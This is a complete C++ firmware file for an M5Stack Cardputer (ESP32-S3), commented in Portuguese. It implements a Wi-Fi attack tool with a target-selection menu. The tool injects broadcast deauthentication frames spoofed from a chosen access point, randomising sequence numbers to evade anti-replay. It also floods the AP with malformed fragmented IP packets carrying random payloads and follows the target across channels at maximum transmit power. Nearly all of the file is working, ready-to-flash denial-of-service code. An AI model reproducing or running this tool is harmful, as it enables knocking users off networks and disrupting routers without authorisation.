#include <M5Unified.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <nvs_flash.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <atomic>
#include <lwip/def.h> 

// -------------------------------------------------------------------
// 1. ESTRUTURAS DE ATAQUE (Layer 2 e Layer 3)
// -------------------------------------------------------------------
// __attribute__((packed)) garante que o compilador não adicione bytes extras (padding),
// mantendo o cabeçalho perfeito para injeção via rádio.
struct __attribute__((packed)) DeauthPacket {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];
    uint8_t  mac_src[6];
    uint8_t  mac_bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
};

struct __attribute__((packed)) MacHeader {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];   
    uint8_t  mac_src[6];    
    uint8_t  mac_bssid[6];  
    uint16_t seq_ctrl;
};

struct __attribute__((packed)) IpHeader {
    uint8_t  version_ihl;   
    uint8_t  tos;
    uint16_t total_length;
    uint16_t id;
    uint16_t frag_off;      
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint8_t  ip_src[4];     
    uint8_t  ip_dest[4];    
};

struct __attribute__((packed)) SilverBulletPacket {
    MacHeader mac;
    IpHeader ip;
    uint8_t payload[32];    
};

// -------------------------------------------------------------------
// 2. VARIÁVEIS GLOBAIS E SINCRONIZAÇÃO (Thread-Safe)
// -------------------------------------------------------------------
#define MAX_ALVOS 10
wifi_ap_record_t alvos_encontrados[MAX_ALVOS];
uint16_t total_alvos = 0;
int alvo_selecionado = 0;

// Variáveis atômicas previnem "Race Conditions" entre os Cores do ESP32-S3
std::atomic<uint8_t> canal_atual_alvo{0};
std::atomic<int8_t> rssi_alvo{0};
std::atomic<bool> alvo_perdido{false};
std::atomic<bool> tx_power_max{true}; // Controle térmico e de bateria

enum EstadoFerramenta { ESTADO_ESCANEAR, ESTADO_SELECIONAR, ESTADO_ATIRAR };
std::atomic<EstadoFerramenta> estado_atual{ESTADO_ESCANEAR};

// -------------------------------------------------------------------
// 3. UTILITÁRIOS E INTERFACE (UI)
// -------------------------------------------------------------------
void escanear_redes() {
    M5.Display.clear();
    M5.Display.setCursor(0, 0);
    M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
    M5.Display.println("📡 Escaneando Redes 2.4GHz...");

    wifi_scan_config_t scan_config = { .ssid = 0, .bssid = 0, .channel = 0, .show_hidden = true };
    esp_wifi_scan_start(&scan_config, true);
    
    uint16_t max_aps = MAX_ALVOS;
    esp_wifi_scan_get_ap_records(&max_aps, alvos_encontrados);
    esp_wifi_scan_get_ap_num(&total_alvos);
    
    if (total_alvos > MAX_ALVOS) total_alvos = MAX_ALVOS;
    alvo_selecionado = 0;
    
    estado_atual.store(ESTADO_SELECIONAR);
}

void desenhar_menu() {
    M5.Display.clear();
    M5.Display.setCursor(0, 0);
    
    // Mostra o status da potência do rádio (bateria/calor)
    M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
    M5.Display.printf("⚡ PWR: %s | [ESPACO] Muda\n", tx_power_max.load() ? "MAX (20dBm)" : "ECO (10dBm)");
    M5.Display.drawLine(0, 15, 240, 15, TFT_DARKGREY);
    M5.Display.setCursor(0, 20);

    if (total_alvos == 0) {
        M5.Display.setTextColor(TFT_RED, TFT_BLACK);
        M5.Display.println("Nenhum alvo encontrado!");
        M5.Display.println("Pressione [ENTER] para re-scan.");
        return;
    }

    for (int i = 0; i < total_alvos; i++) {
        if (i == alvo_selecionado) {
            M5.Display.setTextColor(TFT_BLACK, TFT_WHITE); // Highlight no alvo
        } else {
            M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
        }
        M5.Display.printf("%d. %s (CH: %d)\n", i + 1, alvos_encontrados[i].ssid, alvos_encontrados[i].primary);
    }
}

uint16_t calcular_checksum_ip(void *vdata, size_t length) {
    char *data = (char *)vdata;
    uint32_t acc = 0xffff;
    for (size_t i = 0; i + 1 < length; i += 2) {
        uint16_t word;
        memcpy(&word, data + i, 2);
        acc += ntohs(word);
        if (acc > 0xffff) acc -= 0xffff;
    }
    if (length & 1) {
        uint16_t word = 0;
        memcpy(&word, data + length - 1, 1);
        acc += ntohs(word);
        if (acc > 0xffff) acc -= 0xffff;
    }
    return htons(~acc);
}

void gerar_payload_dinamico(uint8_t* payload, size_t tamanho) {
    for(size_t i = 0; i < tamanho; i++) {
        payload[i] = (uint8_t)(esp_random() & 0xFF);
    }
}

// -------------------------------------------------------------------
// 4. TASK: MONITORAMENTO INTELIGENTE (Core 1)
// -------------------------------------------------------------------
void task_monitoramento(void *pvParameters) {
    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR) {
            uint8_t* bssid = alvos_encontrados[alvo_selecionado].bssid;
            wifi_scan_config_t scan_config = { .ssid = 0, .bssid = bssid, .channel = canal_atual_alvo.load(), .show_hidden = true };
            
            esp_wifi_scan_start(&scan_config, true);
            uint16_t ap_count = 1;
            wifi_ap_record_t temp_record;
            esp_wifi_scan_get_ap_records(&ap_count, &temp_record);
            
            if (ap_count > 0) {
                rssi_alvo.store(temp_record.rssi);
                alvo_perdido.store(false);
            } else {
                // Rastreamento Automático (Auto-Channel Tracking)
                alvo_perdido.store(true);
                for (int ch = 1; ch <= 13; ch++) {
                    scan_config.channel = ch;
                    esp_wifi_scan_start(&scan_config, true);
                    ap_count = 1;
                    esp_wifi_scan_get_ap_records(&ap_count, &temp_record);
                    if (ap_count > 0) {
                        canal_atual_alvo.store(ch);
                        rssi_alvo.store(temp_record.rssi);
                        alvo_perdido.store(false);
                        break;
                    }
                }
            }
        }
        vTaskDelay(pdMS_TO_TICKS(2000)); 
    }
}

// -------------------------------------------------------------------
// 5. TASK: INTERFACE GRÁFICA (Core 1)
// -------------------------------------------------------------------
void task_display(void *pvParameters) {
    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR) {
            if (!alvo_perdido.load()) {
                M5.Display.setCursor(0, 0);
                M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                M5.Display.printf("⚔️ ATAQUE: %s\n", alvos_encontrados[alvo_selecionado].ssid);
                M5.Display.printf("CH: %d | RSSI: %d dBm \nBAT: %.2fV\n", 
                                  canal_atual_alvo.load(), rssi_alvo.load(), M5.Power.getBatteryVoltage());
                
                // Barra de sinal visual
                int barra = map(rssi_alvo.load(), -100, -20, 0, 240);
                M5.Display.fillRect(0, 50, barra, 10, (rssi_alvo.load() > -65) ? TFT_GREEN : TFT_MAROON);
                M5.Display.fillRect(barra, 50, 240-barra, 10, TFT_BLACK); // Limpa o rastro
                
                M5.Display.setCursor(0, 70);
                M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
                M5.Display.println("[BACKSPACE] para abortar.");
                
            } else {
                M5.Display.setCursor(0, 40);
                M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
                M5.Display.printf("⚠️ ALVO PERDIDO! RASTREANDO...\n");
            }
        }
        vTaskDelay(pdMS_TO_TICKS(250)); // Atualiza UI a 4 FPS
    }
}

// -------------------------------------------------------------------
// 6. TASK: MOTOR DE ATAQUE HÍBRIDO ASSÍNCRONO (Core 0)
// -------------------------------------------------------------------
void task_ataque(void *pvParameters) {
    SilverBulletPacket pkt;
    DeauthPacket deauth;

    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load()) {
            
            // Controle Térmico: Ajusta a potência on-the-fly
            if(tx_power_max.load()) {
                esp_wifi_set_max_tx_power(80); // 20dBm (Máximo, gasta bateria rápido)
            } else {
                esp_wifi_set_max_tx_power(40); // 10dBm (Modo ECO, evita superaquecimento)
            }

            esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
            uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;

            // Prepara base Deauth (Layer 2)
            memset(&deauth, 0, sizeof(deauth));
            deauth.frame_control = 0x00C0; 
            memcpy(deauth.mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6); // Broadcast
            memcpy(deauth.mac_src, mac_alvo, 6);
            memcpy(deauth.mac_bssid, mac_alvo, 6);
            deauth.reason_code = 0x0001;

            // Prepara base Fragmentação (Layer 3)
            memset(&pkt, 0, sizeof(pkt));
            pkt.mac.frame_control = 0x0008; 
            memcpy(pkt.mac.mac_dest, mac_alvo, 6);
            memcpy(pkt.mac.mac_bssid, mac_alvo, 6);
            pkt.ip.version_ihl = 0x45; 
            pkt.ip.total_length = htons(0xFFFF); 
            pkt.ip.frag_off = htons(0x2000); 
            pkt.ip.protocol = 17;

            // 1. Rajada L2 (Desconexão)
            for(int j=0; j<5; j++) {
                deauth.seq_ctrl = (esp_random() & 0xFFF) << 4; // Burlar Anti-Replay
                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &deauth, sizeof(deauth), false);
                if (err == ESP_ERR_NO_MEM) vTaskDelay(pdMS_TO_TICKS(1)); // Proteção de Buffer
            }

            // 2. Rajada L3 (Fuzzing Dinâmico)
            for (int i = 0; i < 60; i++) {
                // MELHORIA: O payload agora é re-gerado a CADA pacote, 
                // forçando o roteador a inspecionar lixo novo sempre (Stress DPI)
                gerar_payload_dinamico(pkt.payload, sizeof(pkt.payload)); 
                
                pkt.ip.id = (uint16_t)esp_random(); 
                pkt.ip.checksum = 0; 
                pkt.ip.checksum = calcular_checksum_ip(&pkt.ip, sizeof(IpHeader));
                
                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &pkt, sizeof(pkt), false);
                if (err == ESP_ERR_NO_MEM) vTaskDelay(pdMS_TO_TICKS(1));
            }

            // Respiro pro Watchdog (Evita Kernel Panic no Core 0)
            vTaskDelay(pdMS_TO_TICKS(1)); 

        } else {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }
}

// -------------------------------------------------------------------
// 7. APP MAIN (Input / Controle de Estado)
// -------------------------------------------------------------------
extern "C" void app_main(void) {
    auto cfg = M5.config();
    M5.begin(cfg);
    M5.Display.setRotation(1);
    M5.Display.setTextSize(1.5); // Fonte levemente maior para melhor leitura
    
    nvs_flash_init();
    esp_netif_init();
    esp_event_loop_create_default();
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&wifi_cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    // Inicia Tasks
    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, configMAX_PRIORITIES - 1, NULL, 0); // Core 0 (Ataque)
    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); // Core 1 (Tracker)
    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); // Core 1 (UI)

    escanear_redes();
    desenhar_menu();

    while (true) {
        M5.update(); // Atualiza o estado do teclado do Cardputer
        
        if (estado_atual.load() == ESTADO_SELECIONAR) {
            
            // Verifica se há redes antes de navegar (Proteção contra Underflow)
            if (total_alvos > 0) {
                if (M5.Keyboard.isKeyPressed(KEY_DOWN) && alvo_selecionado < (total_alvos - 1)) {
                    alvo_selecionado++; 
                    desenhar_menu(); 
                    vTaskDelay(pdMS_TO_TICKS(200)); // Debounce aprimorado
                }
                if (M5.Keyboard.isKeyPressed(KEY_UP) && alvo_selecionado > 0) {
                    alvo_selecionado--; 
                    desenhar_menu(); 
                    vTaskDelay(pdMS_TO_TICKS(200));
                }
            }

            // Alternar Potência do Rádio (Barra de Espaço)
            if (M5.Keyboard.isKeyPressed(' ')) {
                tx_power_max.store(!tx_power_max.load());
                desenhar_menu();
                vTaskDelay(pdMS_TO_TICKS(300));
            }

            // Iniciar Ataque
            if (M5.Keyboard.isKeyPressed(KEY_ENTER)) {
                if (total_alvos > 0) {
                    canal_atual_alvo.store(alvos_encontrados[alvo_selecionado].primary);
                    M5.Display.clear();
                    esp_wifi_set_promiscuous(true);
                    estado_atual.store(ESTADO_ATIRAR);
                } else {
                    escanear_redes();
                    desenhar_menu();
                }
                vTaskDelay(pdMS_TO_TICKS(300));
            }
        } 
        else if (estado_atual.load() == ESTADO_ATIRAR) {
            // Parar ataque
            if (M5.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
                estado_atual.store(ESTADO_SELECIONAR); 
                esp_wifi_set_promiscuous(false);
                escanear_redes(); // Força um re-scan para atualizar as redes ao sair
                desenhar_menu();
                vTaskDelay(pdMS_TO_TICKS(300));
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}